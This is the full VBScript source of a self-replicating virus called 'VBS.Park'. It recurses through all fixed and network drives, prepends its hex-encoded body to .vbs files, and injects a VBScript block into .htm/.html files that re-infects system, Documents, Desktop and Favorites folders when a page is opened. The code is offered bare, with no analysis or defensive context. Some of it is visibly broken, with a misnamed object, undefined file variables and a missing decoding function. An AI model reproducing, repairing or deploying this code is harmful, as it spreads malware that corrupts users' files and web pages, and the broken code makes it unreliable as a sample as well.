'VBS.Park

On Error Resume Next


Set fs=CreateObject("Scripting.FileSystemObject")
Set ws=CreateObject("WScript.Shell")

Set fl=fs0.OpenTextFile(WScript.ScriptFullName,1)
virus=fl.ReadAll
fl.Close

f="virhex="""

For i=1 to Len(virus)
e=Mid(virus,i,1)
e=Hex(Asc(e))
If Len(e)=1 Then
e="0"&e
End If
f=f & e
Next

f=f & """"

On Error Resume Next
For each drv in fs.Drives
If drv.DriveType=2 or drv.DriveType=3 Then
list(drv.path&"\")
End If
Next

Sub list(dir)
On Error Resume Next
For each ssf in fs.GetFolder(dir).SubFolders
infect(ssf.path)
list(ssf.path)
Next
End Sub

Sub infect(dir)
For each fil in fs.GetFolder(dir).Files
ext=lcase(fs.GetExtensionName(fil.path))

If ext="vbs" Then
Set vb=fs.OpenTextFile(Q.path,1)
If vb.ReadLine <> ""'VBS.Park"" Then
vbsorg=vb.ReadAll()
vb.Close
Set vb=fs.OpenTextFile(Q.path,2)
vb.WriteLine read(virhex)
vb.WriteLine vbsorg
vb.Close
Else
vb.Close
End If

ElseIf ext="htm" or ext="html" Then

Set ht=fs.OpentextFile(P.path,1)
htmf=ht.ReadAll
ht.Close
If InStr(1,htmf,"virhex",1) = 0 Then

Set ht=fs.OpentextFile(P.path,8)
ht.WriteBlankLines(2)
ht.WriteLine "<SCRIPT LANGUAGE=VBScript>"
ht.WriteLine "Set fs=CreateObject(""Scripting.FileSystemObject"")"
ht.WriteLine "Set ws=CreateObject(""WScript.Shell"")"
ht.WriteLine f
ht.WriteLine "Infect(fso.GetSpecialFolder(0))"
ht.WriteLine "Infect(fso.GetSpecialFolder(1))"
ht.WriteLine "Infect(fso.GetSpecialFolder(2))"
ht.WriteLine "Infect(""C:\"")"
ht.WriteLine "Infect(ws.SpecialFolders(""MyDocuments""))"
ht.WriteLine "Infect(ws.SpecialFolders(""Desktop""))"
ht.WriteLine "Infect(ws.SpecialFolders(""Favorites""))"
ht.WriteLine "Sub Infect(dir)"
ht.WriteLine "For each Q in fs.GetFolder(dir).Files"
ht.WriteLine "ext=lcase(fs.GetExtensionName(Q.Name))"
ht.WriteLine "If ext=""vbs"" Then"
ht.WriteLine "Set vb=fs.OpenTextFile(Q.path,1)"
ht.WriteLine "If vb.ReadLine <> ""'VBS.Park"" Then"
ht.WriteLine "vbsorg=vb.ReadAll()"
ht.WriteLine "vb.Close"
ht.WriteLine "Set vb=fs.OpenTextFile(Q.path,2)"
ht.WriteLine "vb.WriteLine read(virhex)"
ht.WriteLine "vb.WriteLine vbsorg"
ht.WriteLine "vb.Close"
ht.WriteLine "Else"
ht.WriteLine "vb.Close"
ht.WriteLine "End If"
ht.WriteLine "End If"
ht.WriteLine "If ext=""htm"" or ext=""html"" Then"
ht.WriteLine "Set ht=fs.OpenTextFile(Q.Path,1)"
ht.WriteLine "If ht.ReadLine <> ""<vbshtmpark>"" Then"
ht.WriteLine "htmorg=ht.ReadAll()"
ht.WriteLine "ht.Close"
ht.WriteLine "Set ht=fs.CreateTextFile(Q.Path,2)"
ht.WriteLine "ht.WriteLine ""<vbshtmpark>"""
ht.WriteLine "ht.Write(htmorg)"
ht.WriteLine "ht.WriteLine document.body.CreateTextRange.htmltext"
ht.WriteLine "ht.Close"
ht.WriteLine "Else"
ht.WriteLine "ht.Close"
ht.WriteLine "End If"
ht.WriteLine "End If"
ht.WriteLine "Next"
ht.WriteLine "End Sub"
ht.WriteLine "Function read(octet)"
ht.WriteLine "For hexa=1 To Len(octet) Step 2"
ht.WriteLine "read=read & Chr(""&h"" & Mid(octet, hexa, 2))"
ht.WriteLine "Next"
ht.WriteLine "End Function"
ht.WriteLine "</SCRIPT>"
ht.Close

End If
End If
Next
End Sub